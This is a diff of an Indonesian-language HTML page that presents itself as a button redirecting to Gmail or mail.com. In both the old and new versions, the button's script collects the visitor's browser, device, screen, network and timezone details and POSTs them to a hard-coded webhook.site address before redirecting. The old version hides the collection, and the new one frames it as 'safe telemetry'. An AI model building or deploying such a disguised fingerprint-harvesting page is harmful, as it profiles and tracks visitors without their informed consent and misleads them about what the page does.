@@ -1,445 +1,197 @@
 <!DOCTYPE html>
 <html lang="id">
-
 <head>
-
-<meta charset="UTF-8">
-
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Webhook Redirect Mail</title>
-
-
-<style>
-
-*{
-    box-sizing:border-box;
-}
-
-
-body{
-
-    margin:0;
-
-    min-height:100vh;
-
-    display:flex;
-
-    justify-content:center;
-
-    align-items:center;
-
-    background:
-    linear-gradient(135deg,#111,#444);
-
-    font-family:
-    Arial, sans-serif;
-
-}
-
-
-.card{
-
-    width:90%;
-
-    max-width:450px;
-
-    background:#fff;
-
-    padding:35px;
-
-    border-radius:20px;
-
-    text-align:center;
-
-    box-shadow:
-    0 10px 30px rgba(0,0,0,.4);
-
-}
-
-
-h1{
-
-    color:#222;
-
-    margin-bottom:10px;
-
-}
-
-
-p{
-
-    color:#555;
-
-}
-
-
-button{
-
-    width:100%;
-
-    padding:16px;
-
-    margin-top:20px;
-
-    border:none;
-
-    border-radius:12px;
-
-    background:#0066ff;
-
-    color:white;
-
-    font-size:18px;
-
-    cursor:pointer;
-
-}
-
-
-button:hover{
-
-    background:#0047b3;
-
-}
-
-
-button:disabled{
-
-    background:#888;
-
-}
-
-
-#status{
-
-    margin-top:20px;
-
-    font-size:14px;
-
-    color:#333;
-
-}
-
-
-.loader{
-
-    display:none;
-
-    margin:20px auto;
-
-    width:35px;
-
-    height:35px;
-
-    border:5px solid #ddd;
-
-    border-top:5px solid #0066ff;
-
-    border-radius:50%;
-
-    animation:
-    spin 1s linear infinite;
-
-}
-
-
-@keyframes spin{
-
-    100%{
-        transform:rotate(360deg);
-    }
-
-}
-
-
-</style>
-
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirector & Diagnostics</title>
+    <style>
+        :root {
+            --bg-color: #f4f6f8;
+            --card-bg: #ffffff;
+            --primary: #1a73e8;
+            --text: #3c4043;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 32px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            text-align: center;
+        }
+
+        h2 {
+            margin-top: 0;
+            color: #202124;
+        }
+
+        p {
+            color: #5f6368;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        button, a.btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.2s, transform 0.1s;
+        }
+
+        button:hover, a.btn:hover {
+            background-color: #1557b0;
+        }
+
+        button:active, a.btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            color: var(--primary);
+            border: 1px solid #dadce0;
+        }
+
+        .btn-secondary:hover {
+            background-color: #f1f3f4;
+        }
+
+        #status {
+            margin-top: 16px;
+            font-size: 13px;
+            font-weight: 600;
+            min-height: 20px;
+        }
+
+        .status-success { color: #1e8e3e; }
+        .status-error { color: #d93025; }
+        .status-sending { color: #f9ab00; }
+    </style>
 </head>
-
-
-
 <body>
 
-
-<div class="card">
-
-
-<h1>Lanjutkan</h1>
-
-
-<p>
-Klik tombol untuk membuka mail.com
-</p>
-
-
-<button id="btn">
-Buka Mail
-</button>
-
-
-<div class="loader" id="loader"></div>
-
-
-<div id="status">
-Menunggu klik...
-</div>
-
-
-</div>
-
-
-
-<script>
-
-
-const WEBHOOK_URL =
-"https://webhook.site/cf75fcc7-0cfa-4508-a0cb-f13a2fa22deb";
-
-
-
-const btn =
-document.getElementById("btn");
-
-
-const status =
-document.getElementById("status");
-
-
-const loader =
-document.getElementById("loader");
-
-
-
-btn.onclick = async function(){
-
-
-btn.disabled = true;
-
-
-loader.style.display = "block";
-
-
-status.innerHTML =
-"Mengumpulkan data...";
-
-
-
-let connection = null;
-
-
-if(navigator.connection){
-
-    connection = {
-
-        type:
-        navigator.connection.effectiveType,
-
-        downlink:
-        navigator.connection.downlink,
-
-        rtt:
-        navigator.connection.rtt
-
-    };
-
-}
-
-
-
-const data = {
-
-
-event:
-"button_click",
-
-
-
-timestamp:
-new Date().toISOString(),
-
-
-
-page:{
-
-    url:
-    window.location.href,
-
-    title:
-    document.title,
-
-    referrer:
-    document.referrer
-
-},
-
-
-
-browser:{
-
-    userAgent:
-    navigator.userAgent,
-
-    language:
-    navigator.language,
-
-    languages:
-    navigator.languages,
-
-    platform:
-    navigator.platform,
-
-    online:
-    navigator.onLine,
-
-    cookieEnabled:
-    navigator.cookieEnabled
-
-},
-
-
-
-screen:{
-
-    width:
-    screen.width,
-
-    height:
-    screen.height,
-
-    availableWidth:
-    screen.availWidth,
-
-    availableHeight:
-    screen.availHeight,
-
-    colorDepth:
-    screen.colorDepth,
-
-    pixelRatio:
-    window.devicePixelRatio
-
-},
-
-
-
-window:{
-
-    width:
-    window.innerWidth,
-
-    height:
-    window.innerHeight
-
-},
-
-
-
-device:{
-
-    touch:
-    ("ontouchstart" in window),
-
-    cpu:
-    navigator.hardwareConcurrency || null,
-
-    memory:
-    navigator.deviceMemory || null
-
-},
-
-
-
-timezone:{
-
-    zone:
-    Intl.DateTimeFormat()
-    .resolvedOptions()
-    .timeZone,
-
-    localTime:
-    new Date().toString()
-
-},
-
-
-
-connection:connection
-
-
-
-};
-
-
-
-try{
-
-
-status.innerHTML =
-"Mengirim ke webhook...";
-
-
-
-await fetch(WEBHOOK_URL,{
-
-
-method:"POST",
-
-
-headers:{
-
-    "Content-Type":
-    "text/plain"
-
-},
-
-
-body:
-JSON.stringify(data,null,2)
-
-
-});
-
-
-
-status.innerHTML =
-"Berhasil. Membuka mail.com...";
-
-
-
-}
-
-catch(error){
-
-
-status.innerHTML =
-"Gagal mengirim webhook";
-
-
-console.log(error);
-
-
-}
-
-
-
-setTimeout(function(){
-
-
-window.location.href =
-"https://mail.google.com/mail/u/0/#inbox";
-
-},1500);
-
-
-
-};
-
-
-</script>
-
-
+    <div class="card">
+        <h2>Navigasi Gmail</h2>
+        <p>Kirim data telemetri sistem secara aman dan buka aplikasi Gmail Anda.</p>
+
+        <div class="btn-group">
+            <button id="btn-redirect">Kirim Metadata & Buka Mail</button>
+            <a href="https://mail.google.com/mail/u/0/#inbox" class="btn btn-secondary" target="_blank" rel="noopener">
+                Buka Email Belum Dibaca
+            </a>
+        </div>
+
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://webhook.site/cf75fcc7-0cfa-4508-a0cb-f13a2fa22deb";
+
+        // Fungsi mengumpulkan metadata komprehensif
+        function collectSystemData() {
+            const nav = navigator;
+            const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
+
+            return {
+                event: "button_click",
+                timestamp: new Date().toISOString(),
+                page: {
+                    url: window.location.href,
+                    title: document.title,
+                    referrer: document.referrer || null
+                },
+                client: {
+                    userAgent: nav.userAgent,
+                    language: nav.language,
+                    languages: nav.languages,
+                    platform: nav.platform,
+                    cookieEnabled: nav.cookieEnabled,
+                    onlineStatus: nav.onLine
+                },
+                hardware: {
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+                    colorDepth: screen.colorDepth,
+                    devicePixelRatio: window.devicePixelRatio,
+                    logicalProcessors: nav.hardwareConcurrency || "N/A",
+                    deviceMemoryGB: nav.deviceMemory || "N/A",
+                    touchSupport: "ontouchstart" in window || nav.maxTouchPoints > 0
+                },
+                network: conn ? {
+                    effectiveType: conn.effectiveType,
+                    downlinkMb: conn.downlink,
+                    rttMs: conn.rtt,
+                    saveData: conn.saveData
+                } : "API NetworkInformation tidak didukung",
+                time: {
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    localTime: new Date().toString()
+                }
+            };
+        }
+
+        // Event Listener Tombol Utama
+        document.getElementById("btn-redirect").addEventListener("click", async () => {
+            const statusEl = document.getElementById("status");
+            statusEl.className = "status-sending";
+            statusEl.innerText = "Mengirim telemetri...";
+
+            const payload = collectSystemData();
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "text/plain"
+                    },
+                    body: JSON.stringify(payload, null, 2)
+                });
+
+                statusEl.className = "status-success";
+                statusEl.innerText = "Pengiriman berhasil! Mengalihkan ke Gmail...";
+
+                setTimeout(() => {
+                    window.location.href = "https://mail.google.com/";
+                }, 800);
+
+            } catch (error) {
+                statusEl.className = "status-error";
+                statusEl.innerText = "Gagal mengirim data. Tetap mengalihkan...";
+                console.error("Fetch Error:", error);
+
+                setTimeout(() => {
+                    window.location.href = "https://mail.google.com/";
+                }, 1200);
+            }
+        });
+    </script>
 </body>
-
 </html>
